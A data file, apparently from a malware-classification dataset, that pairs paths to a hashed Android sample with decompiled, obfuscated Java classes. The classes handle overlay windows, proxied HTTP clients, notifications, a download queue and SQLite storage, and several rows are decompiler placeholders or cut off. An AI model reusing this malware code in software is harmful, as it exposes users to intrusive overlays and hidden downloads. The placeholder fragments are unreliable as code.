"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\l.code","public class l implements com.baty.dasy.resy.cac.i.r {   final j a;   public l(  j jVar){     this.a=jVar;   }   @Override public void a(){     CountDownTimer countDownTimer;     Context context;     CountDownTimer countDownTimer2;     this.a.f=false;     countDownTimer=this.a.u;     if (countDownTimer != null) {       countDownTimer2=this.a.u;       countDownTimer2.cancel();     }     context=this.a.f35c;     d.a(context).a();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\m.code","public class m extends CountDownTimer {   final int a;   final j b;   public m(  j jVar,  long j,  long j2,  int i){     super(j,j2);     this.b=jVar;     this.a=i;   }   @Override public void onFinish(){     this.b.a(this.a);   }   @Override public void onTick(  long j){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\n.code","public class n extends Thread {   final j a;   private Context b;   public n(  j jVar,  Context context){     this.a=jVar;     this.b=context;   }   @Override public void run(){     super.run();     o oVar=new o(this.a,this.b);     if (this.a.a == null) {       this.a.a=new Timer();     }     this.a.a.schedule(oVar,1000L,1000L);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\o.code","class o extends TimerTask {   final j a;   private Context b;   public o(  j jVar,  Context context){     this.a=jVar;     this.b=context;   }   @Override public void run(){     Handler handler;     handler=this.a.E;     handler.post(new p(this));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\p.code","class p implements Runnable {   final o a;   public p(  o oVar){     this.a=oVar;   }   private void a(){     com.baty.dasy.resy.cac.c.a aVar;     Context context;     com.baty.dasy.resy.cac.c.a aVar2;     WindowManager windowManager;     WindowManager.LayoutParams layoutParams;     aVar=this.a.a.q;     if (aVar != null) {       context=this.a.a.f35c;       aVar2=this.a.a.q;       com.baty.dasy.resy.cac.i.a a=com.baty.dasy.resy.cac.i.a.a(context,aVar2,1);       this.a.a.a(a);       try {         windowManager=this.a.a.d;         layoutParams=this.a.a.e;         windowManager.updateViewLayout(a,layoutParams);       }  catch (      Exception e) {       }     }   }   @Override public void run(){     Context context;     Context context2;     boolean z;     boolean z2;     context=this.a.b;     int m=com.baty.dasy.resy.cac.j.d.m(context);     context2=this.a.b;     if (m > com.baty.dasy.resy.cac.j.d.n(context2)) {       z2=this.a.a.w;       if (z2) {         this.a.a.w=false;         a();         return;       }       return;     }     z=this.a.a.w;     if (z) {       return;     }     this.a.a.w=true;     a();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\q.code","public class q {   public static HttpClient a(  Context context){     if (c(context) == null) {       return null;     }     if (!b(context)) {       return new DefaultHttpClient();     }     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,30000);     HttpConnectionParams.setSoTimeout(basicHttpParams,30000);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,204800);     HttpClientParams.setRedirecting(basicHttpParams,true);     HttpHost httpHost=new HttpHost(com.baty.dasy.resy.cac.j.a.a(13),80);     if (com.baty.dasy.resy.cac.j.a.a(38).equalsIgnoreCase(c(context))) {       httpHost=new HttpHost(com.baty.dasy.resy.cac.j.a.a(14),80);     }     basicHttpParams.setParameter(""http.route.default-proxy"",httpHost);     return new DefaultHttpClient(basicHttpParams);   }   public static void a(  Context context,  Notification notification,  String str,  int i,  int i2,  Intent intent,  String str2,  int i3){     int i4=i + 400000;     PendingIntent activity=PendingIntent.getActivity(context,i4,intent,134217728);     if (i2 != -99) {       notification.flags=i2;     }     StringBuffer stringBuffer=new StringBuffer();     if (i3 > -1 && i3 <= 100) {       stringBuffer.append(i3);       stringBuffer.append(com.baty.dasy.resy.cac.j.a.a(117));     }     stringBuffer.append(str2);     notification.setLatestEventInfo(context,str,stringBuffer.toString(),activity);     ((NotificationManager)context.getSystemService(""notification"")).notify(i4,notification);   }   public static void a(  Context context,  com.baty.dasy.resy.cac.b.g gVar,  com.baty.dasy.resy.cac.b.b bVar){     com.baty.dasy.resy.cac.b.c a=com.baty.dasy.resy.cac.b.c.a();     if (a == null) {       a=com.baty.dasy.resy.cac.b.c.a(context);     }     com.baty.dasy.resy.cac.b.g b=a.b(gVar);     if (b == null) {       if (bVar != null) {         gVar.a(bVar);       }       gVar.e();       return;     }     if (b.h() != 5 && b.h() != 4) {       b.a(gVar.o());       b.a(bVar);       if (bVar != null) {         bVar.a(b,b.h());         return;       }       return;     }     b.a(gVar.o());     if (!b.c().exists() && b.h() == 4) {       b.a(3);     }     if (bVar != null) {       b.a(bVar);       bVar.a(b,b.h());     }     b.f();   }   protected static boolean b(  Context context){     String c2=c(context);     if (c2 != null) {       return c2.compareTo(com.baty.dasy.resy.cac.j.a.a(39)) == 0 || c2.compareTo(com.baty.dasy.resy.cac.j.a.a(40)) == 0 || c2.compareTo(com.baty.dasy.resy.cac.j.a.a(41)) == 0;     }     return false;   }   public static String c(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\r.code","public class r {   protected View a;   protected com.baty.dasy.resy.cac.c.a b;   private com.baty.dasy.resy.cac.c.a f40c;   private u e;   private Activity f;   private TranslateAnimation i;   private TranslateAnimation j;   private TranslateAnimation k;   private TranslateAnimation l;   private Handler d=new Handler();   private Stack g=new Stack();   private Stack h=new Stack();   private AdapterView.OnItemClickListener m=new t(this);   public r(  Activity activity){     this.f40c=null;     this.f=activity;     com.baty.dasy.resy.cac.j.a.a(activity);     com.baty.dasy.resy.cac.b.c.a(activity);     activity.requestWindowFeature(1);     Intent intent=activity.getIntent();     String stringExtra=intent.getStringExtra(com.baty.dasy.resy.cac.j.a.a(36));     boolean booleanExtra=intent.getBooleanExtra(com.baty.dasy.resy.cac.j.a.a(74),false);     String stringExtra2=intent.getStringExtra(com.baty.dasy.resy.cac.j.a.a(75));     com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();     if (!aVar.a(stringExtra)) {       activity.finish();     }  else {       if (booleanExtra) {         a(aVar,stringExtra2);         if (this.g == null || (this.g != null && this.g.size() < 1)) {           activity.finish();           return;         }         return;       }       d();       this.f40c=aVar;       this.e=new u(activity,aVar,this.f40c.f + "","");       this.e.a(this.m);       this.e.b();       a(this.e.e());       a(this.f40c);       if (this.f40c.y == 1) {         this.f40c.x=1;         com.baty.dasy.resy.cac.j.d.e(activity,this.f40c);         new com.baty.dasy.resy.cac.e.b().a(activity,1);       }     }     c();   }   private void a(  com.baty.dasy.resy.cac.c.a aVar,  String str){     if (str == null || """".equals(str)) {       return;     }     if (new File(str).exists()) {       com.baty.dasy.resy.cac.j.d.a(this.f,str,aVar.f);     }  else {       com.baty.dasy.resy.cac.j.d.a(this.f,aVar);     }   }   public void b(  com.baty.dasy.resy.cac.c.a aVar){     int size=this.h.size();     int i=0;     int i2=-1;     while (i < size) {       int i3=((com.baty.dasy.resy.cac.c.a)this.h.get(i)).f.equals(aVar.f) ? i : i2;       i++;       i2=i3;     }     if (i2 != -1) {       this.h.remove(i2);       this.g.remove(i2);     }   }   private void d(){     this.i=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     this.i.setDuration(400L);     this.i.setFillAfter(true);     this.i.setInterpolator(new LinearInterpolator());     this.j=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     this.j.setDuration(400L);     this.j.setFillAfter(true);     this.j.setInterpolator(new LinearInterpolator());     this.k=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);     this.k.setDuration(400L);     this.k.setFillAfter(true);     this.k.setInterpolator(new LinearInterpolator());     this.l=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);     this.l.setDuration(400L);     this.l.setFillAfter(true);     this.l.setInterpolator(new LinearInterpolator());   }   public View a(){     if (this.g.size() <= 1) {       this.f.finish();       return null;     }     View view=(View)this.g.pop();     view.clearFocus();     view.startAnimation(this.k);     this.a=(View)this.g.peek();     this.a.setFocusable(true);     this.f.setContentView(this.a);     this.a.invalidate();     this.a.requestFocus();     this.a.startAnimation(this.l);     return this.a;   }   public void a(  Intent intent){     String stringExtra=intent.getStringExtra(com.baty.dasy.resy.cac.j.a.a(36));     boolean booleanExtra=intent.getBooleanExtra(com.baty.dasy.resy.cac.j.a.a(74),false);     String stringExtra2=intent.getStringExtra(com.baty.dasy.resy.cac.j.a.a(75));     com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();     if (aVar.a(stringExtra)) {       if (booleanExtra) {         a(aVar,stringExtra2);         if (this.g == null || (this.g != null && this.g.size() < 1)) {           this.f.finish();           return;         }         return;       }       if (this.f40c == null || this.f40c.e != aVar.e) {         b(aVar);         this.f40c=aVar;         this.e=new u(this.f,aVar,this.e != null ? this.e.d() : """");         this.e.a(this.m);         a(this.e.a);         a(aVar);       }     }   }   public void a(  View view){     this.d.post(new s(this,view));   }   public void a(  com.baty.dasy.resy.cac.c.a aVar){     this.h.push(aVar);     this.b=aVar;     this.f40c=this.b;   }   public boolean a(  int i,  KeyEvent keyEvent){     if (this.e != null && this.e.c()) {       return true;     }     if (this.e == null || this.e.c()) {       return false;     }     com.baty.dasy.resy.cac.i.f fVar=(com.baty.dasy.resy.cac.i.f)a();     com.baty.dasy.resy.cac.c.a b=b();     if (this.e != null && fVar != null && b != null) {       this.e.a(fVar);       this.e.a(b);       this.e.a();       this.f40c=b;       fVar.d();     }     return true;   }   public com.baty.dasy.resy.cac.c.a b(){     if (this.h.size() <= 1) {       return null;     }     this.h.pop();     this.b=(com.baty.dasy.resy.cac.c.a)this.h.peek();     return this.b;   }   public void c(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\s.code","public class s implements Runnable {   final View a;   final r b;   public s(  r rVar,  View view){     this.b=rVar;     this.a=view;   }   @Override public void run(){     Stack stack;     Stack stack2;     Activity activity;     Stack stack3;     TranslateAnimation translateAnimation;     Stack stack4;     TranslateAnimation translateAnimation2;     stack=this.b.g;     if (stack.size() > 0) {       stack4=this.b.g;       View view=(View)stack4.peek();       view.clearFocus();       translateAnimation2=this.b.i;       view.startAnimation(translateAnimation2);     }     stack2=this.b.g;     stack2.push(this.a);     this.b.a=this.a;     activity=this.b.f;     activity.setContentView(this.a);     this.a.requestFocus();     stack3=this.b.g;     if (stack3.size() > 1) {       View view2=this.a;       translateAnimation=this.b.j;       view2.startAnimation(translateAnimation);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\t.code","public class t implements AdapterView.OnItemClickListener {   final r a;   public t(  r rVar){     this.a=rVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     Activity activity;     u uVar;     Activity activity2;     u uVar2;     AdapterView.OnItemClickListener onItemClickListener;     u uVar3;     Activity activity3;     Activity activity4;     Activity activity5;     u uVar4;     Activity activity6;     Activity activity7;     com.baty.dasy.resy.cac.c.a aVar=(com.baty.dasy.resy.cac.c.a)adapterView.getAdapter().getItem(i);     activity=this.a.f;     if (com.baty.dasy.resy.cac.j.d.j(activity,aVar.f)) {       activity6=this.a.f;       com.baty.dasy.resy.cac.j.d.e(activity6,aVar.f);       activity7=this.a.f;       Toast.makeText(activity7,com.baty.dasy.resy.cac.j.a.a(93) + aVar.d + ""..."",1500).show();       return;     }     String str="""";     uVar=this.a.e;     if (uVar != null) {       uVar4=this.a.e;       str=uVar4.d();     }     this.a.b(aVar);     r rVar=this.a;     activity2=this.a.f;     rVar.e=new u(activity2,aVar,str);     uVar2=this.a.e;     onItemClickListener=this.a.m;     uVar2.a(onItemClickListener);     r rVar2=this.a;     uVar3=this.a.e;     rVar2.a(uVar3.a);     this.a.a(aVar);     activity3=this.a.f;     com.baty.dasy.resy.cac.j.d.d(activity3,aVar);     aVar.x=1;     activity4=this.a.f;     com.baty.dasy.resy.cac.j.d.f(activity4,aVar);     com.baty.dasy.resy.cac.e.b bVar=new com.baty.dasy.resy.cac.e.b();     activity5=this.a.f;     bVar.a(activity5,2);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\u.code","public class u implements com.baty.dasy.resy.cac.e.f, com.baty.dasy.resy.cac.g.e {   public com.baty.dasy.resy.cac.i.f a;   private Activity b;   private com.baty.dasy.resy.cac.c.a f41c;   private int d;   private StringBuffer e=new StringBuffer();   private Handler f=new w(this);   private Handler g=new x(this);   private View.OnClickListener h=new y(this);   public u(  Activity activity,  com.baty.dasy.resy.cac.c.a aVar,  String str){     this.b=activity;     this.f41c=aVar;     this.a=new com.baty.dasy.resy.cac.i.f(activity);     c(aVar);     g();     this.g.postDelayed(new v(this,str),400L);     a();   }   public void a(  String str){     com.baty.dasy.resy.cac.e.d dVar=null;     if (0 == 0 || !(0 == 0 || dVar.a())) {       com.baty.dasy.resy.cac.e.d dVar2=new com.baty.dasy.resy.cac.e.d(this.b);       dVar2.a(str,this.f41c.e);       dVar2.a(this);       this.a.c();     }   }   public int b(  String str){     if (str == null) {       return -1;     }     if (str != null && str.equals("""")) {       return -1;     }     int lastIndexOf=str.lastIndexOf(""/"");     try {       return Integer.valueOf(str.substring(str.substring(0,lastIndexOf).lastIndexOf(""/"") + 1,lastIndexOf)).intValue();     }  catch (    Exception e) {       return -1;     }   }   public Intent c(  String str){     Intent intent=new Intent(""android.intent.action.SEND"");     intent.setType(""text/plain"");     intent.putExtra(""android.intent.extra.TEXT"",str);     return Intent.createChooser(intent,com.baty.dasy.resy.cac.j.a.a(57));   }   private void c(  com.baty.dasy.resy.cac.c.a aVar){     com.baty.dasy.resy.cac.b.a aVar2=new com.baty.dasy.resy.cac.b.a(this.b,aVar,this.g);     com.baty.dasy.resy.cac.b.g gVar=new com.baty.dasy.resy.cac.b.g(aVar.k,com.baty.dasy.resy.cac.j.d.b(this.b,com.baty.dasy.resy.cac.j.d.d(aVar.k),aVar.e),0);     gVar.a((Object)(-1));     q.a(this.b,gVar,aVar2);     com.baty.dasy.resy.cac.b.a aVar3=new com.baty.dasy.resy.cac.b.a(this.b,aVar,this.g);     String[] a=com.baty.dasy.resy.cac.j.d.a(aVar.l,"";"");     if (a != null) {       this.d=a.length;     }     for (int i=0; i < this.d; i++) {       com.baty.dasy.resy.cac.b.g gVar2=new com.baty.dasy.resy.cac.b.g(a[i],com.baty.dasy.resy.cac.j.d.b(this.b,com.baty.dasy.resy.cac.j.d.d(a[i]),aVar.e),0);       gVar2.a(Integer.valueOf(i));       q.a(this.b,gVar2,aVar3);     }   }   public void f(){     if (com.baty.dasy.resy.cac.j.d.j(this.b,this.f41c.f)) {       this.f41c.u=true;       this.a.f(com.baty.dasy.resy.cac.j.a.a(46));       return;     }     if (com.baty.dasy.resy.cac.j.j.b(this.f41c).exists()) {       this.f41c.v=true;       this.a.f(com.baty.dasy.resy.cac.j.a.a(88));       return;     }     if (com.baty.dasy.resy.cac.b.c.a() != null) {       for (      com.baty.dasy.resy.cac.b.g gVar : com.baty.dasy.resy.cac.b.c.a().d()) {         if (gVar.c() != null && gVar.c().getAbsolutePath().equals(com.baty.dasy.resy.cac.j.j.a(this.b,this.f41c).getAbsolutePath())) {           if (gVar.h() == 2) {             this.f41c.w=true;             this.a.f(com.baty.dasy.resy.cac.j.a.a(48));             return;           }  else           if (gVar.h() == 5) {             this.a.f(com.baty.dasy.resy.cac.j.a.a(49));             return;           }  else           if (gVar.h() == 0 || gVar.h() == 1) {             this.a.f(com.baty.dasy.resy.cac.j.a.a(77));             return;           }         }       }     }   }   private void g(){     this.a.c(this.f41c.a);     this.a.b(this.f41c.g);     this.a.a(this.f41c.d);     this.a.b(this.d);     this.a.e(this.f41c.h);     this.a.a(this.f41c.i);     this.a.a(this.h);   }   public void a(){     com.baty.dasy.resy.cac.b.a.a(this.f);     com.baty.dasy.resy.cac.g.c.a(this);     f();     c(this.f41c);   }   public void a(  AdapterView.OnItemClickListener onItemClickListener){     this.a.a(onItemClickListener);   }   public void a(  com.baty.dasy.resy.cac.c.a aVar){     this.f41c=aVar;   }   public void a(  com.baty.dasy.resy.cac.i.f fVar){     this.a=fVar;   }   @Override public void a(  com.baty.dasy.resy.cac.c.h[] hVarArr,  int i){     if (this.f41c.e != i || hVarArr == null) {       return;     }     this.g.post(new z(this,hVarArr));   }   public void b(){     this.b.setContentView(this.a);   }   @Override public void b(  com.baty.dasy.resy.cac.c.a aVar){     if (aVar.e == this.f41c.e) {       this.g.post(new aa(this));     }   }   public boolean c(){     return this.a.a();   }   public String d(){     return this.e.toString();   }   public com.baty.dasy.resy.cac.i.f e(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\v.code","public class v implements Runnable {   final String a;   final u b;   public v(  u uVar,  String str){     this.b=uVar;     this.a=str;   }   @Override public void run(){     this.b.a(this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\w.code","public class w extends Handler {   final u a;   public w(  u uVar){     this.a=uVar;   }   @Override public void handleMessage(  Message message){     com.baty.dasy.resy.cac.c.a aVar;     Bundle data=message.getData();     int i=data.getInt(com.baty.dasy.resy.cac.j.a.a(85),-1);     boolean z=data.getBoolean(com.baty.dasy.resy.cac.j.a.a(96),false);     boolean z2=data.getBoolean(com.baty.dasy.resy.cac.j.a.a(95),false);     int i2=data.getInt(com.baty.dasy.resy.cac.j.a.a(94),0);     aVar=this.a.f41c;     if (aVar.e == i) {       if (z) {         this.a.a.f(com.baty.dasy.resy.cac.j.a.a(49));       }  else       if (z2) {         this.a.a.f(com.baty.dasy.resy.cac.j.a.a(88));       }  else {         this.a.a.f(com.baty.dasy.resy.cac.j.a.a(47) + "" "" + i2+ ""%"");       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\x.code","public class x extends Handler {   final u a;   public x(  u uVar){     this.a=uVar;   }   @Override public void handleMessage(  Message message){     int b;     com.baty.dasy.resy.cac.c.a aVar;     Activity activity;     Activity activity2;     Bundle data=message.getData();     int i=data.getInt(""tag"");     String string=data.getString(com.baty.dasy.resy.cac.j.a.a(118));     b=this.a.b(string);     aVar=this.a.f41c;     if (b == aVar.e) {       if (i == -1) {         com.baty.dasy.resy.cac.i.f fVar=this.a.a;         activity2=this.a.b;         fVar.a(com.baty.dasy.resy.cac.j.i.a(activity2,string));       }  else       if (i > -1) {         com.baty.dasy.resy.cac.i.f fVar2=this.a.a;         activity=this.a.b;         fVar2.a(com.baty.dasy.resy.cac.j.i.a(activity,string),i);       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\y.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5354720e"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\yait.code","public class yait {   private static yait m=null;   private yait(  Context context,  String str,  String str2){     h.a(context,yait.class,str,str2);   }   public static yait scvy(  Context context,  String str,  String str2){     if (m == null) {       m=new yait(context,str,str2);     }     return m;   }   public void mcty(  int i,  int i2,  Object obj,  int i3){     h.a(i,i2,obj,i3);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac\z.code","class z implements Runnable {   final com.baty.dasy.resy.cac.c.h[] a;   final u b;   public z(  u uVar,  com.baty.dasy.resy.cac.c.h[] hVarArr){     this.b=uVar;     this.a=hVarArr;   }   @Override public void run(){     StringBuffer stringBuffer;     StringBuffer stringBuffer2;     com.baty.dasy.resy.cac.c.a aVar;     StringBuffer stringBuffer3;     StringBuffer stringBuffer4;     StringBuffer stringBuffer5;     StringBuffer stringBuffer6;     StringBuffer stringBuffer7;     ArrayList arrayList=new ArrayList();     stringBuffer=this.b.e;     if (stringBuffer.length() > 0) {       stringBuffer6=this.b.e;       stringBuffer7=this.b.e;       stringBuffer6.delete(0,stringBuffer7.length());     }     stringBuffer2=this.b.e;     aVar=this.b.f41c;     stringBuffer2.append(aVar.f);     stringBuffer3=this.b.e;     stringBuffer3.append("","");     for (    com.baty.dasy.resy.cac.c.h hVar : this.a) {       com.baty.dasy.resy.cac.c.a a=com.baty.dasy.resy.cac.j.d.a(hVar);       arrayList.add(a);       stringBuffer4=this.b.e;       stringBuffer4.append(a.f);       stringBuffer5=this.b.e;       stringBuffer5.append("","");     }     if (this.b.a == null || arrayList == null || arrayList.size() == 0) {       return;     }     this.b.a.b(arrayList);     this.b.a.b();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.a\a.code","public class a {   private final LinkedHashMap a;   private int b;   private int f0c;   private int d;   private int e;   private int f;   private int g;   public a(  int i){     if (i <= 0) {       throw new IllegalArgumentException("""");     }     this.f0c=i;     this.a=new LinkedHashMap(0,0.75f,true);   }   private void a(  int r5){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.a.a.a(int):void"");   }   private int b(  Object obj,  Object obj2){     int a=a(obj,obj2);     if (a < 0) {       throw new IllegalStateException("""");     }     return a;   }   protected int a(  Object obj,  Object obj2){     return 1;   }   public final Object a(  Object obj){     Object obj2=null;     if (obj != null) { synchronized (this) {         Object obj3=this.a.get(obj);         if (obj3 != null) {           this.f++;           obj2=obj3;         }  else {           this.g++;           Object b=b(obj);           if (b != null) { synchronized (this) {               this.d++;               obj2=this.a.put(obj,b);               if (obj2 != null) {                 this.a.put(obj,obj2);               }  else {                 this.b+=b(obj,b);               }             }             if (obj2 != null) {               a(false,obj,b,obj2);             }  else {               a(this.f0c);               obj2=b;             }           }         }       }     }     return obj2;   }   public final synchronized Map a(){     return new LinkedHashMap(this.a);   }   protected void a(  boolean z,  Object obj,  Object obj2,  Object obj3){   }   protected Object b(  Object obj){     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.a\b.code","public class b extends a {   private static b a;   private ArrayList b;   public b(  int i){     super(i);     this.b=new ArrayList();   }   public static b a(  Context context){     ((ActivityManager)context.getSystemService(""activity"")).getMemoryClass();     if (a == null) {       a=new b(5242880);     }     return a;   }   private void a(  String str){     int i=0;     while (true) {       int i2=i;       if (i2 >= this.b.size()) {         return;       }       ((c)this.b.get(i2)).a(str);       i=i2 + 1;     }   }   @Override public int a(  String str,  Bitmap bitmap){     return bitmap.getHeight() * bitmap.getRowBytes();   }   @Override public void a(  boolean z,  String str,  Bitmap bitmap,  Bitmap bitmap2){     if (z && bitmap2 == null) {       a(str);       if (bitmap == null || bitmap.isRecycled()) {         return;       }       bitmap.recycle();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.a\c.code","public interface c {   void a(  String str); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.b\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@743b720"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.b\b.code","public interface b {   void a(  g gVar,  int i);   void a(  g gVar,  long j); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.b\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1758a1b3"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.b\d.code","class d {   public String a;   public String b;   public int f5c;   public int d=-1;   public int e;   public String f;   public String g;   public int h;   public String i;   public long j;   public String toString(){     return ""["" + this.a + "" ""+ this.b+ "" ""+ this.e+ "" ""+ this.f5c+ "" ""+ this.d+ ""  ""+ this.f+ ""  ""+ this.g+ "" ""+ this.i+ "" ""+ this.j+ ""]"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.b\e.code","class e {   private static String b=com.baty.dasy.resy.cac.j.a.a(16);   private static String f6c=com.baty.dasy.resy.cac.j.a.a(17);   private static String d=com.baty.dasy.resy.cac.j.a.a(18);   private static String e=com.baty.dasy.resy.cac.j.a.a(19);   private static String f=com.baty.dasy.resy.cac.j.a.a(20);   private static String g=com.baty.dasy.resy.cac.j.a.a(21);   private static String h=com.baty.dasy.resy.cac.j.a.a(22);   private static String i=com.baty.dasy.resy.cac.j.a.a(23);   private static String j=com.baty.dasy.resy.cac.j.a.a(24);   private static String k=com.baty.dasy.resy.cac.j.a.a(25);   private static String l=com.baty.dasy.resy.cac.j.a.a(26);   private f a;   public e(  Context context){     this.a=new f(context);   }   public List a(){     ArrayList arrayList=new ArrayList();     SQLiteDatabase readableDatabase=this.a.getReadableDatabase();     Cursor query=readableDatabase.query(com.baty.dasy.resy.cac.j.a.a(103),null,null,null,null,null,null);     while (query.moveToNext()) {       d dVar=new d();       dVar.a=query.getString(query.getColumnIndex(f6c));       dVar.b=query.getString(query.getColumnIndex(d));       dVar.f5c=query.getInt(query.getColumnIndex(e));       dVar.d=query.getInt(query.getColumnIndex(f));       dVar.e=query.getInt(query.getColumnIndex(g));       dVar.f=query.getString(query.getColumnIndex(i));       dVar.g=query.getString(query.getColumnIndex(h));       dVar.h=query.getInt(query.getColumnIndex(j));       dVar.i=query.getString(query.getColumnIndex(k));       dVar.j=query.getLong(query.getColumnIndex(l));       arrayList.add(dVar);     }     query.close();     readableDatabase.close();     return arrayList;   }   public synchronized void a(  d dVar){     SQLiteDatabase writableDatabase=this.a.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(f6c,dVar.a);     contentValues.put(d,dVar.b);     contentValues.put(e,Integer.valueOf(dVar.f5c));     contentValues.put(f,Integer.valueOf(dVar.d));     contentValues.put(g,Integer.valueOf(dVar.e));     contentValues.put(i,dVar.f);     contentValues.put(h,dVar.g);     contentValues.put(j,Integer.valueOf(dVar.h));     contentValues.put(k,dVar.i);     contentValues.put(l,Long.valueOf(dVar.j));     writableDatabase.insert(com.baty.dasy.resy.cac.j.a.a(103),null,contentValues);     writableDatabase.close();   }   public void b(  d dVar){     SQLiteDatabase writableDatabase=this.a.getWritableDatabase();     writableDatabase.delete(com.baty.dasy.resy.cac.j.a.a(103),com.baty.dasy.resy.cac.j.a.a(110),new String[]{dVar.a,dVar.b});     writableDatabase.close();   }   public synchronized void c(  d dVar){     SQLiteDatabase writableDatabase=this.a.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(f6c,dVar.a);     contentValues.put(d,dVar.b);     contentValues.put(e,Integer.valueOf(dVar.f5c));     contentValues.put(f,Integer.valueOf(dVar.d));     contentValues.put(g,Integer.valueOf(dVar.e));     contentValues.put(i,dVar.f);     contentValues.put(h,dVar.g);     contentValues.put(j,Integer.valueOf(dVar.h));     contentValues.put(k,dVar.i);     contentValues.put(l,Long.valueOf(dVar.j));     writableDatabase.update(com.baty.dasy.resy.cac.j.a.a(103),contentValues,com.baty.dasy.resy.cac.j.a.a(110),new String[]{dVar.a,dVar.b});     writableDatabase.close();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.b\f.code","public class f extends SQLiteOpenHelper {   public f(  Context context){     super(context,com.baty.dasy.resy.cac.j.a.a(15),(SQLiteDatabase.CursorFactory)null,5);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     String str;     String str2;     String str3;     String str4;     String str5;     String str6;     String str7;     String str8;     String str9;     String str10;     String str11;     long currentTimeMillis=System.currentTimeMillis();     StringBuilder append=new StringBuilder().append(""CREATE TABLE "").append(com.baty.dasy.resy.cac.j.a.a(103)).append("" ("");     str=e.b;     StringBuilder append2=append.append(str).append("" INTEGER PRIMARY KEY,"");     str2=e.f6c;     StringBuilder append3=append2.append(str2).append("" TEXT,"");     str3=e.d;     StringBuilder append4=append3.append(str3).append("" TEXT,"");     str4=e.e;     StringBuilder append5=append4.append(str4).append("" 